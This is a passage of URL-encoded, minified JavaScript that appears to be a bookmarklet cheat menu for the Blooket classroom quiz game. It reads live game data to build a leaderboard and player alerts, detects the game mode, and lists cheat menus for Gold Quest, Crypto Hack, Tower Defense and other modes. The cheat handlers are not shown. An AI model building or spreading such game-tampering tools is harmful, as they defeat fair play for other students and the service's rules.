%7Blb:%22Lunch%20Break%22,as:%22Ad%20Spam%22,e37:%22Error%2037%22,nt:%22Night%20Time%22,lo:%22#LOL%22,j:%22Jokester%22,sm:%22Slow%20Mo%22,dp:%22Dance%20Party%22,v:%22Vortex%22,r:%22Reverse%22,f:%22Flip%22,m:%22Micro%22%7D;this.connection.on(%22value%22,e=%3E%7Bvar%20t=e.val()%7C%7C%7B%7D;if(t&&this.diffObjects(this.data,t))%7Bvar%20o,a,r,n,i,s,l,c,d=this.diffObjects(this.data,t);this.data=t;let%20e;switch(k)%7Bcase%22racing%22:e=Object.entries(t).map((%5Be,%7Bb:t,pr:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));case%22classic%22:e=Object.entries(t).map((%5Be,%7Bb:t,p:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));case%22royale%22:e=Object.entries(t).map((%5Be,%7Bb:t,e:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));case%22workshop%22:e=Object.entries(t).map((%5Be,%7Bb:t,t:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));case%22brawl%22:e=Object.entries(t).map((%5Be,%7Bb:t,xp:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));case%22defense%22:case%22defense2%22:e=Object.entries(t).map((%5Be,%7Bb:t,d:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));case%22gold%22:for(const%20h%20in%20d)d%5Bh%5D.tat&&(%5Bo,a%5D=d%5Bh%5D.tat.split(%22:%22),%22swap%22==a?this.addAlert(h,f%5Bt%5Bh%5D.b%5D?.url,%22just%20swapped%20with%20%22+o):this.addAlert(h,f%5Bt%5Bh%5D.b%5D?.url,%60just%20took%20$%7Bthis.parseNumber(parseInt(a))%7D%20gold%20from%20%60+o));e=Object.entries(t).map((%5Be,%7Bb:t,g:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));break;case%22hack%22:for(const%20b%20in%20d)d%5Bb%5D.tat&&(%5Br,n%5D=d%5Bb%5D.tat.split(%22:%22),this.addAlert(b,f%5Bt%5Bb%5D.b%5D?.url,%60just%20took%20$%7Bthis.parseNumber(parseInt(n))%7D%20crypto%20from%20%60+r));e=Object.entries(t).map((%5Be,%7Bb:t,cr:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));break;case%22fishing%22:for(const%20g%20in%20d)%22Frenzy%22==d%5Bg%5D.f?this.addAlert(g,f%5Bt%5Bg%5D.b%5D?.url,%22just%20started%20a%20frenzy%22):d%5Bg%5D.s&&this.addAlert(g,f%5Bt%5Bg%5D.b%5D?.url,%60just%20sent%20a%20$%7Bd%5Bg%5D.f%7D%20distraction%60);e=Object.entries(t).map((%5Be,%7Bb:t,w:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));break;case%22dino%22:for(const%20y%20in%20d)d%5By%5D.tat&&(%5Bi,s%5D=d%5By%5D.tat.split(%22:%22),%22true%22==s?this.addAlert(y,f%5Bt%5By%5D.b%5D?.url,%60just%20caught%20$%7Bi%7D%20CHEATING!%60):this.addAlert(y,f%5Bt%5By%5D.b%5D?.url,%22investigated%20%22+i));e=Object.entries(t).map((%5Be,%7Bb:t,f:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));break;case%22cafe%22:for(const%20v%20in%20d)d%5Bv%5D.up&&(%5Bl,c%5D=d%5Bv%5D.up.split(%22:%22),c)&&this.addAlert(v,f%5Bt%5Bv%5D.b%5D?.url,%60upgraded%20$%7Bl%7D%20to%20level%20%60+c);e=Object.entries(t).map((%5Be,%7Bb:t,ca:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D));break;case%22factory%22:for(const%20w%20in%20d)%7Bvar%20u,p,m=d%5Bw%5D;m.g?this.addAlert(w,f%5Bt%5Bw%5D.b%5D?.url,%60activated%20the%20$%7Bj%5Bm.g%5D%7D%20glitch!%60):m.s?(%5Bu,p%5D=m.s.split(%22-%22),this.addAlert(w,f%5Bt%5Bw%5D.b%5D?.url,%60has%20a%20$%7Bu%7D%20$%7Bp%7D%20synergy!%60)):m.t&&this.addAlert(w,f%5Bt%5Bw%5D.b%5D?.url,%22now%20has%2010%20Blooks!%22)%7De=Object.entries(t).map((%5Be,%7Bb:t,ca:o%7D%5D)=%3E(%7Bname:e,blook:t,value:o%7C%7C0%7D))%7Dthis.updateLeaderboard(e.sort((e,t)=%3Et.value-e.value))%7D%7D)%7Dcatch%7Breturn!1%7D%7D,diffObjects(e,t)%7Bvar%20o,a=%7B%7D;for(const%20r%20in%20e)r%20in%20t&&(%22object%22==typeof%20e%5Br%5D&&%22object%22==typeof%20t%5Br%5D?(o=this.diffObjects(e%5Br%5D,t%5Br%5D))&&0!==Object.keys(o).length&&(a%5Br%5D=o):JSON.stringify(e%5Br%5D)!==JSON.stringify(t%5Br%5D)&&(a%5Br%5D=t%5Br%5D));for(const%20n%20in%20t)n%20in%20e%7C%7C(a%5Bn%5D=t%5Bn%5D);return%200==Object.keys(a).length?null:a%7D,getGamemode()%7Bswitch(window.location.pathname)%7Bcase%22/play/racing%22:return%22racing%22;case%22/play/factory%22:return%22factory%22;case%22/play/classic/get-ready%22:case%22/play/classic/question%22:case%22/play/classic/answer/sent%22:case%22/play/classic/answer/result%22:case%22/play/classic/standings%22:return%22classic%22;case%22/play/battle-royale/match/preview%22:case%22/play/battle-royale/question%22:case%22/play/battle-royale/answer/sent%22:case%22/play/battle-royale/answer/result%22:case%22/play/battle-royale/match/result%22:return%22royale%22;case%22/play/toy%22:return%22workshop%22;case%22/play/gold%22:return%22gold%22;case%22/play/brawl%22:return%22brawl%22;case%22/play/hack%22:return%22hack%22;case%22/play/fishing%22:return%22fishing%22;case%22/play/rush%22:return%22rush%22;case%22/play/dino%22:return%22dino%22;case%22/tower/map%22:case%22/tower/battle%22:case%22/tower/rest%22:case%22/tower/risk%22:case%22/tower/shop%22:case%22/tower/victory%22:return%22doom%22;case%22/cafe%22:case%22/cafe/shop%22:return%22cafe%22;case%22/defense%22:return%22defense%22;case%22/play/defense2%22:return%22defense2%22;case%22/kingdom%22:return%22kingdom%22;default:return!1%7D%7D%7D%5D%7D;function%20N(e,t)%7Bvar%20o,a,r=0,n=0;e.onpointerdown=function(e=window.event)%7Br=e.clientX,n=e.clientY,document.onpointerup=function()%7Bdocument.onpointerup=null,document.onpointermove=null%7D,document.onpointermove=function(e=window.event)%7Bo=r-e.clientX,a=n-e.clientY,r=e.clientX,n=e.clientY;t.style.top=t.offsetTop-a+%22px%22,t.style.left=t.offsetLeft-o+%22px%22%7D%7D%7Dj(%22Alerts%22,null,S.alerts,!0),j(%22Global%22,%22https://media.blooket.com/image/upload/v1661496291/Media/uiTest/Games_Played_2.svg%22,S.global)(),j('%3Cspan%20style=%22font-size:%2018px%22%3EPirate%5C's%20Voyage%3C/span%3E',%22data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj48c3ZnIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCAzMDAgMzAwIiB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zOnNlcmlmPSJodHRwOi8vd3d3LnNlcmlmLmNvbS8iIHN0eWxlPSJmaWxsLXJ1bGU6ZXZlbm9kZDtjbGlwLXJ1bGU6ZXZlbm9kZDtzdHJva2UtbGluZWpvaW46cm91bmQ7c3Ryb2tlLW1pdGVybGltaXQ6MjsiPjxnIGlkPSJCb2F0Ij48cGF0aCBkPSJNMTcwLjQsNTYuMDU0Yy02OC43ODgsMTAuMTc0IC0xMTUuOTcxLDU2LjkzOCAtMTQ1LjQxMSwxMzMuNzVsMTUuNDY5LDcuNzM0YzMwLjk2MiwtMjguMTc1IDc0LjcwNSwtMzcuNzg3IDEzMi4zMjIsLTI3LjI1bDAsLTE3LjYxMWMtMjUuNjI5LC0yNy45NTIgLTI2Ljk2NiwtNTYuNzcyIDAuNzE0LC04Ni42MjhsLTMuMDk0LC05Ljk5NVoiIHN0eWxlPSJmaWxsOiNmNmUwYmQ7Ii8+PHBhdGggZD0iTTE5OS42NzMsNjAuODEzYzMyLjc4NCw0Mi45ODIgNjUuODIyLDkwLjg4NyA5Ny4zMzcsMTM5LjU4MWwtNi42NjMsMGMtMTIuMDg1LC0zMS4xMTEgLTU3Ljg4MiwtMzkuNjk0IC05MS42MjYsLTI3LjI1YzIyLjUxNCwtMzQuNTc5IDE3Ljc5NiwtNzIuNjczIDAuOTUyLC0xMTIuMzMxWiIgc3R5bGU9ImZpbGw6I2Y2ZTBiZDsiLz48cGF0aCBkPSJNNjkuNDQ4LDE5Ny41MzhjMCwwIC01OS43MDcsLTE1LjI0MyAtNjguMzk4LC0xNy40NjJjLTAuMDc2LC0wLjAxOSAtMC4xNTQsMC4wMiAtMC4xODQsMC4wOTJjLTAuMDMsMC4wNzIgLTAuMDAyLDAuMTU1IDAuMDY1LDAuMTk1YzkuNjgyLDUuNzc1IDkxLjY0Nyw1NC42NTggOTEuNjQ3LDU0LjY1OGwtMjMuMTMsLTM3LjQ4M1oiIHN0eWxlPSJmaWxsOiM4ZDZlNDE7Ii8+PHBhdGggZD0iTTE2NC40NSw0Ny45MDNjMCwtNS4zNTMgNC4zNDYsLTkuNjk4IDkuNjk4LC05LjY5OGwxOS4zOTcsLTBjNS4zNTIsLTAgOS42OTgsNC4zNDUgOS42OTgsOS42OThsLTAsMTU2Ljk1M2MtMCw1LjM1MyAtNC4zNDYsOS42OTggLTkuNjk4LDkuNjk4bC0xOS4zOTcsMGMtNS4zNTIsMCAtOS42OTgsLTQuMzQ1IC05LjY5OCwtOS42OThsMCwtMTU2Ljk1M1oiIHN0eWxlPSJmaWxsOiM3ZjY4NDU7Ii8+PHBhdGggZD0iTTI2My45OTMsMjU2LjEwM2MyMi4xNzEsLTE0LjcxIDM2LjAwNywtMzUuNTE1IDM2LjAwNywtNTguNTY1bC0yMzAuNTUyLDBjMCwyMy43MTMgMTQuNjQzLDQ1LjA1IDM3Ljk0LDU5LjgxOWM5Ljg3NSwtMy43MjkgMjAuMDQxLC0xMS4zMzQgMzAuNDYzLC0yMi4zMzZjMzIuODExLDM1LjQ1NSA2NC4wNjksMzUuOTQzIDkzLjcwOCwwYzYuODM4LDkuNjc3IDE3LjczNiwxNi42NDYgMzIuNDM0LDIxLjA4MloiIHN0eWxlPSJmaWxsOiNiNjkyNWY7Ii8+PC9nPjwvc3ZnPg==%22,S.voyage),j(%22Gold%20Quest%22,%22https://media.blooket.com/image/upload/v1661496292/Media/uiTest/Gold.svg%22,S.gold),j(%22Cafe%22,%22https://media.blooket.com/image/upload/v1655161189/Media/survivor/Pizza_lvl1.svg%22,S.cafe),j(%22Crypto%20Hack%22,%22https://media.blooket.com/image/upload/v1661496293/Media/uiTest/CryptoIcon.svg%22,S.crypto),j('%3Cspan%20style=%22font-size:%2017px%22%3EDeceptive%20Dinos%3C/span%3E',%5B'%3Cimg%20style=%22height:%2030px;%20margin-left:%208px;%20margin-right:%2012px%22%20src=%22https://media.blooket.com/image/upload/v1655161325/Media/survivor/Dog.svg%22%3E'%5D,S.dinos),j('%3Cspan%20style=%22font-size:%2018px%22%3ETower%20Defense%3C/span%3E',%5B'%3Cimg%20style=%22width:%2030px;%20margin-right:%205px%22%20src=%22https://media.blooket.com/image/upload/v1657235025/Media/survivor/Laser_Lvl1.svg%22%3E'%5D,S.defense),j('%3Cspan%20style=%22font-size:%2016px%22%3ETower%20Defense%202%3C/span%3E',%5B'%3Cimg%20style=%22width:%2030px;%20margin-right:%205px;%20rotate:%2045deg%22%20src=%22https://media.blooket.com/image/upload/v1593095354/Media/defense/missile.svg%22%3E'%5D,S.defense2),j(%22Factory%22,%22https://media.blooket.com/image/upload/v1661496293/Media/uiTest/Factory_Upgrades.svg%22,S.factory),j('%3Cspan%20style=%22font-size:%2019px%22%3EFishing%20Frenzy%3C/span%3E',%22https://media.blooket.com/image/upload/v1661496295/Media/uiTest/Fish_Weight.svg%22,S.fishing),j(%22Flappy%20Blook%22,%22https://media.blooket.com/image/upload/v1645222006/Blooks/yellowBird.svg%22,S.flappy),j('%3Cspan%20style=%22font-size:%2017px%22%3ETower%20of%20Doom%3C/span%3E',%5B'%3Cimg%20style=%22height:%2030px;%20margin-left:%205px;%20margin-right:%2010px%22%20src=%22https://media.blooket.com/image/upload/v1657235023/Media/survivor/cards-05.svg%22%3E'%5D,S.doom),j('%3Cspan%20style=%22font-size:%2018px%22%3ECrazy%20Kingdom%3C/span%3E',%22https://media.blooket.com/image/upload/v1655161323/Media/survivor/Jester_lvl1.svg%22,S.kingdom),j(%22Racing%22,%22https://media.blooket.com/image/upload/v1661496295/Media/uiTest/Racing_Progress.svg%22,S.racing),j(%22Battle%20Royale%22,%22https://media.blooket.com/image/upload/v1655936179/Media/br/VS_Lightning_Bolt_Bottom.svg%22,S.royale),j(%22Blook%20Rush%22,%22data:image/png;base64,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%22,S.rush),j('%3Cspan%20style=%22font-size:%2018px%22%3EMonster%20Brawl%3C/span%3E',%5B'%3Cimg%20style=%22height:%2028px;%20margin-left:%205px;%20margin-right:%208px%22%20src=%22https://media.blooket.com/image/upload/v1655233787/Media/survivor/xp/Blue_xp_2.svg%22%3E'%5D,S.brawl),j('%3Cspan%20style=%22font-size:%2015px%22%3ESanta%5C's%20Workshop%3C/span%3E',%5B'%3Cimg%20style=%22height:%2028px;%20margin-left:%203px;%20margin-right:%206px%22%20src=%22data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pgo8IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTkuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+CjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iQ2FwYV8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIKCSB2aWV3Qm94PSIwIDAgNTEyIDUxMiIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNTEyIDUxMjsiIHhtbDpzcGFjZT0icHJlc2VydmUiPgo8cGF0aCBzdHlsZT0iZmlsbDojRkZERTc2OyIgZD0iTTQzMy42NjEsMjM3LjgzN2MtNC40OTctNi4yMTQtNC44OC0xNC40NC0xLjIyNS0yMS4xODRjMTEuMzY1LTIwLjk2NywxNy43NzMtNDUuMDE0LDE3LjY1MS03MC41NjYKCUM0NDkuNzAxLDY0Ljg2OSwzODIuNTY0LTEuMDM3LDMwMS4zNTIsMC4wMTJjLTgwLjE4MywxLjAzNi0xNDQuODY0LDY2LjM1OS0xNDQuODY0LDE0Ni43ODhjMCwzMi41NTMsMTAuNTk1LDYyLjYzLDI4LjUyNiw4Ni45NzIKCWM3Ljc1MywxMC41MjYsNy4yMTMsMjUuMS0xLjU0MywzNC44MDhjLTEzLjI5NywxNC43NDEtNDEuOTM1LDI0LjMwNi0xMDIuNTk1LTE2LjI3N2MtNi42NTItNC40NS0xNC40NjItNi44NjQtMjIuNDY1LTYuODY0bDAsMAoJYy0xOS45NDcsMC0zNi44MzMsMTQuNjI4LTM5Ljc3NiwzNC4zNTdDNy44ODksMzUxLjgxNiw2LjUyLDUxMiwyMDYuOTY2LDUxMmg3MS4wODNDNDY2LjA1LDUxMiw1MTYuMTI3LDM1MS44MDEsNDMzLjY2MSwyMzcuODM3eiIvPgo8Zz4KCTxwYXRoIHN0eWxlPSJmaWxsOiNGRkI2NDE7IiBkPSJNMTgzLjQ3LDI2OC41ODJjLTMuOTMsNC4zNTctOS4yMDIsOC4yNjEtMTYuMjQ0LDEwLjU1MmMyNC40NjksNS44ODIsMzguODItMS4zMTksNDcuMTQ5LTEwLjU1MgoJCWM4Ljc1Ny05LjcwOCw5LjI5Ni0yNC4yODEsMS41NDMtMzQuODA4Yy0xNy45My0yNC4zNDItMjguNTI2LTU0LjQyLTI4LjUyNi04Ni45NzNjMC03NS44MzMsNTcuNTAzLTEzOC4yMjYsMTMxLjI4MS0xNDUuOTgKCQljLTUuNjg5LTAuNjAxLTExLjQ2Ny0wLjg4NC0xNy4zMjMtMC44MDljLTgwLjE4MywxLjAzNi0xNDQuODY0LDY2LjM1OS0xNDQuODY0LDE0Ni43ODhjMCwzMi41NTMsMTAuNTk1LDYyLjYzLDI4LjUyNiw4Ni45NzMKCQlDMTkyLjc2NiwyNDQuMywxOTIuMjI2LDI1OC44NzMsMTgzLjQ3LDI2OC41ODJ6Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojRkZCNjQxOyIgZD0iTTQ5LjUzOSwyNzkuNzk2YzIuMTM3LTE0LjMxNywxMS42MTgtMjUuOTQyLDI0LjI4Mi0zMS4yNDVjLTQuODY2LTIuMDIyLTEwLjA5MS0zLjExLTE1LjQxMi0zLjExCgkJbDAsMGMtMTkuOTQ3LDAtMzYuODMzLDE0LjYyOC0zOS43NzYsMzQuMzU3QzcuODg5LDM1MS44MTYsNi41Miw1MTIsMjA2Ljk2Niw1MTJoMzAuOTA1QzM3LjQyNSw1MTIsMzguNzk0LDM1MS44MTYsNDkuNTM5LDI3OS43OTZ6CgkJIi8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojRkZCNjQxOyIgZD0iTTgwLjUxOCwzNDQuMzM2Yy04Ljc2Niw4LjY1Ni0xMC4yNzcsMjIuMjY4LTMuNTk4LDMyLjYxOQoJCWMxOS41MDQsMzAuMjI3LDY4LjM1MSw4Ni4yODMsMTYyLjM3Miw4Ni4yODNjNTcuMjU2LDAsMTE3Ljc5MS0zNS44MDksMTI5LjA2NC05NS4wOTdjOS4zMS00OC45NjYtMTkuMjQ2LTEwOC44MjEtNzUuMzMtMTA2LjI0NwoJCWMtNDEuMDk3LDEuODg3LTY1LjEzNSwzNy40MTUtOTkuODY1LDUzLjg0MWMtMjQuMzk4LDExLjU0LTUwLjg0NCwxOC42NTEtNzcuNjg3LDIxLjMwNwoJCUMxMDIuNjk4LDMzOC4zMDYsOTAuODA1LDMzNC4xNzgsODAuNTE4LDM0NC4zMzZ6Ii8+CjwvZz4KPHBhdGggc3R5bGU9ImZpbGw6IzM4NDg0QTsiIGQ9Ik0zODguMzk0LDExMC44MzNjLTMuNTAyLDAtNi42NzQtMi4zOTYtNy41MTMtNS45NTFsLTMuNzE1LTE1LjczCgljLTAuOTgxLTQuMTUzLDEuNTkxLTguMzE1LDUuNzQzLTkuMjk1YzQuMTUyLTAuOTc5LDguMzE1LDEuNTkxLDkuMjk1LDUuNzQzbDMuNzE1LDE1LjczYzAuOTgxLDQuMTUzLTEuNTkxLDguMzE1LTUuNzQzLDkuMjk1CglDMzg5LjU4LDExMC43NjUsMzg4Ljk4MiwxMTAuODMzLDM4OC4zOTQsMTEwLjgzM3oiLz4KPHBhdGggc3R5bGU9ImZpbGw6I0ZGQjY0